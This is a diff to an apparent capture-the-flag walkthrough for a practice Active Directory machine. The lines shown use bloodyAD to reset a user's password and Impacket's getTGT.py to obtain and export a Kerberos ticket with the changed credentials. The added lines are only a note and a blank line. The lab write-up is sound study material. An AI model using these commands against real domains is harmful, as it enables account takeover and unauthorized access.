@@ -221,6 +221,9 @@ bloodyAD --host 10.10.11.42 -d administrator.htb -u michael -p 'popopopo' set pa
 > Take note to ensure your password aligns with the password policy, this isn't hard as if it doesn't align you'd get errors.
 
 I'm not a massive fan of using a changed password and suspect it will get cleaned up in a while so let's grab a TGT.
+
+> These steps as I will soon learn aren't necessary as all I need is his password to access ftp. But it's good to keep in mind nonetheless.
+
 ```bash
 getTGT.py -dc-ip "10.10.11.42" "administrator.htb"/"benjamin":"P@ssword"
 Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
@@ -228,6 +231,7 @@ Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its a
 [*] Saving ticket in benjamin.ccache
 ```
 And let's export our `KRB5CCNAME` to make it easier to access later.
+
 ```bash
 export KRB5CCNAME="$(pwd)/benjamin.ccache"
 ```
